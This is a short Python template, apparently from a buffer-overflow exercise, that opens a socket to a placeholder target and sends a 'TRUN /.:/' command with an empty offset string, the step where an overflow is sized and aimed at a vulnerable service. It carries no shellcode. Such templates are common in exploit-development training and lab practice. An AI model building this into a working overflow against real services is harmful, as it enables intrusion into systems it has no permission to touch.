#!/usr/bin/python3
import sys, socket

offset = ""

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('<target_ip>', < port >))
    payload = 'TRUN /.:/' + offset
    s.send(payload.encode())
    s.close()
except:
    print("Error connecting to server")
    sys.exit()

